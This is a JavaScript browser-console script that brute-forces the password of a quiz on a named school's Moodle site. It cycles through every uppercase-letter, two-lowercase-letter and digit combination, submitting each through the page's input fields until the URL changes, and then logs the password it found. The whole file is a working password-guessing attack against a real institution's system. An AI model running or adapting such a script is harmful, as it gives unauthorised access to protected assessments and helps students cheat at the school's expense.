const alphabet = [...Array(26).keys()].map(n => String.fromCharCode(n + 97)).join("");

function product(...nums) {
    var answer = 1;
    for (var n of nums) {
        answer *= n;
    }
    return answer;
}

function * combinations (...options) {
    console.log(options);
    var combo = Array(options.length).fill(0);
    var repetitions = [...Array(options.length).keys()]
    repetitions = repetitions.map(i => product(...options.slice(i).map(arr => arr.length))).reverse();
    console.log(repetitions);
    to = product(...options.map(arr => arr.length))
    console.log("Up to:", to);
    for (var i = 0; i < to; i++){
        for (var pos = 0; pos < options.length; pos++) {
            combo[pos] = (Math.floor(i / Math.floor(repetitions[pos] / options[pos].length))) % options[pos].length
        }
        values = combo;
        for (var n = 0; n < values.length; n++) {
            values[n] = options[n][values[n]];
        }
        if (i % 1000 == 0) {
            console.log(`At ${i} out of ${to} (trying ${values.join("")})`);
        }
        yield values.join("");
    }
}

//console.log(Array.from(combinations(alphabet.toUpperCase(), alphabet, alphabet, alphabet, "123")));


for (var word of combinations(alphabet.toUpperCase(), alphabet, alphabet, "0123456789")) {
    document.getElementsByTagName('input')[3].value = word
    document.getElementsByTagName('input')[4].click()
    if (document.URL != "https://moodle.cedarsupper.org.uk/moodle/mod/quiz/startattempt.php") {
        console.log("The password was:", word);
        break;
    }
}
console.log("No match found");